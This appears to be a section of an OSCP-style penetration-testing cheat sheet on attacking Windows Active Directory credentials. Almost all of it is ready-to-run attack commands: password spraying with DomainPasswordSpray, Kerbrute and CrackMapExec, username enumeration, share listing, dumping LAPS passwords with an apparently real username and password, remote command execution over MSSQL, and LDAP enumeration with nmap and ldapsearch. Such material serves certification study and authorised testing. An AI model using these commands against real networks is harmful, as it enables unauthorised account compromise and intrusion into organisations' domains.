We can do various password attacks on the Windows AD to get the user access credentials

### [PasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

It is a powershell script that tries the passwords for all users in the domain, that has to be launched inside an AD-joined machine.

```powershell
.\Spray-Passwords.ps1 -Pass <PASSWORD>
```

### [Kerbrute](https://github.com/ropnop/kerbrute)

From a Linux machine instead we can run AD password attack with Kerbrute. We can use this script also from a Window machine joined in the domain.

```shell
./kerbrute_linux_amd64 passwordspray -d <DOMAIN> domain_users.txt <PASSWORD>
```

Kerbrute can be used also to get a list of users, if the machine is vulnerable to as-rep roasting. Search for valid user without credentials with the following

```shell
kerbrute userenum -d <DOMAIN> usernames.txt
```

or

```shell
kerbrute -domain <DOMAIN> -users users.txt -dc-ip <IP>
```

### [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)

[](https://github.com/sarthakpriyadarshi/OSCP-Pentesting-Cheatsheet?tab=readme-ov-file#crackmapexec)

Crackmapexec is a tool for password spraying in the Active Directory network. It can be used for example against the SMB service with

```shell
crackmapexec smb <IP> -u users -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
```

List access for shares in the domain for the users in users.txt with passwords passwords.txt

```shell
crackmapexec smb <IP> -u users.txt -p passwords.txt --shares
```

Run crackmapexec through a proxy (eg chisel) and performing a **local authentication** (No Active Directory Authentication)

proxychains crackmapexec smb -u users.txt -p 'PASSWORD' --continue-on-success --local-auth

Run crackmapexec and dump [LAPS](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) passwords

```shell
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```

Run crackmapesec to against mssql

```shell
crackmapexec mssql -d <DOMAIN> -u <username> -p <password> -x "whoami"
```

### LDAP

First we run nmap against ldap server

```shell
nmap --script "ldap* and not brute" $ip -p 389 -v -Pn -sT <IP>
```

Then using ldapsearch we can extract credentials. The -b parameter in the ldapsearch command specifies the base DN (Distinguished Name) for the search. The DN is essentially the starting point in the LDAP directory tree from which the search will begin. Think of it as the root of your search within the  LDAP stucture. Example taken from [here](https://medium.com/@0xrave/kyoto-proving-grounds-practice-walkthrough-active-directory-820dfcff5ddd).

```shell
ldapsearch -x -h <IP> -b "dc=X,dc=Y"
```